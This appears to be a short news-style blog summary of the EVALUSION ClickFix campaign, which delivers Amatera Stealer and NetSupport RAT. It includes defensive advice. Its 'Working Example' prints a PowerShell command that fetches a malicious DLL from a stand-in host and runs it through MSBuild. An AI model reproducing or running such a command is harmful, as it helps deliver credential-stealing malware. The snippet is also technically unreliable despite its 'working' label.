---
title: "EVALUSION ClickFix Campaign Deploys Amatera Stealer and NetSupport RAT"
pubDate: 2025-11-17
description: "A new EVALUSION campaign leverages ClickFix social engineering to deliver Amatera Stealer and NetSupport RAT, impacting users across multiple phishing attacks."
categories: ["AI News", "Cybersecurity", "Malware"]
---

## EVALUSION ClickFix Campaign Deploys Amatera Stealer and NetSupport RAT

Researchers have identified a malware campaign, dubbed EVALUSION, utilizing the ClickFix social engineering technique to deploy both Amatera Stealer and NetSupport RAT. First observed in June 2025, Amatera is a sophisticated stealer evolving from the ACR stealer and available via subscription for as little as $199/month.

### Why This Matters
Current threat detection often struggles with multi-stage, fileless attacks like these. Ideal security models assume static code analysis can identify malicious intent, but ClickFix campaigns exploit legitimate system tools (mshta.exe, PowerShell) to bypass these defenses, resulting in data breaches and potential remote access compromise. The cost of remediation from a successful RAT deployment can easily exceed $50,000 per incident, including data recovery and system restoration.

### Key Insights
- **Amatera evolution:** Amatera builds upon the AcridRain (ACR) stealer, initially a MaaS offering discontinued in July 2024.
- **ClickFix tactic:** Users are tricked into executing malicious commands via the Windows Run dialog, bypassing traditional security measures.
- **PureCrypter use:** The Amatera Stealer DLL is packed using PureCrypter, a C#-based crypter also offered as a MaaS.

### Working Example
```powershell
# Example PowerShell command used in the ClickFix campaign
Invoke-WebRequest -Uri "https://example.com/malicious.dll" -OutFile "$env:TEMP\malicious.dll"
Start-Process -FilePath "MSBuild.exe" -ArgumentList "/t:Build /p:Configuration=Release malicious.dll"
```

### Practical Applications
- **Use Case**: Financial institutions are prime targets, as Amatera specifically targets cryptocurrency wallets and banking credentials.
- **Pitfall**: Relying solely on signature-based antivirus solutions is insufficient; behavioral analysis and endpoint detection are crucial.

**References:**
- https://thehackernews.com/2025/11/new-evalusion-clickfix-campaign.html